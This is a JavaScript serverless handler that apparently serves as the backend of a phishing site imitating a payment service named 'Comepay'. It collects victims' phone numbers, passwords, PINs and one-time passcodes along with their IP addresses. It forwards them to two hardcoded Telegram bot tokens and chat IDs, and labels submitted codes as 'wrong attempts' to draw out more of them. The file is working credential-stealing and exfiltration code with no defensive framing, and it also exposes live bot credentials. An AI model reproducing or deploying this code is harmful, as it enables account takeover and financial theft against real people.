export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, phone, pass, pin, otp } = req.body;

  // --- TELEGRAM BOT CONFIGURATION ---
  const BOT_TOKEN_1 = '8447954817:AAGbj18Ezfw0KL0ZKue35ApU2NRfw3zPSeU';
  const CHAT_ID_1 = '6842614309';

  const BOT_TOKEN_2 = '9138054480:AAFrMp3vXH9zE4q63GNRAUh1O0Ase1tZqEQ'; 
  const CHAT_ID_2 = '1745333535';

  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';

  let message = '';

  if (type === 'login') {
    message = `✅ <b>New Comepay Login</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: <code>${phone}</code>\n🔑 Password: <code>${pass}</code>\n🔐 PIN: <code>${pin || 'N/A'}</code>`;
  } else if (type === 'send_otp' || type === 'modal_otp') {
    message = `🔐 <b>OTP Requested (Comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
  } else if (type === 'verify_otp') {
    message = `🔑 <b>OTP Entered (Wrong Attempt - Comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
  } else {
    message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
  }

  try {
    const promises = [];

    if (BOT_TOKEN_1 && CHAT_ID_1) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID_1, text: message, parse_mode: 'HTML' })
        })
      );
    }

    if (BOT_TOKEN_2 && CHAT_ID_2) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID_2, text: message, parse_mode: 'HTML' })
        })
      );
    }

    await Promise.all(promises);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram API error:', err);
    return res.status(500).json({ error: 'Failed to send messages' });
  }
}
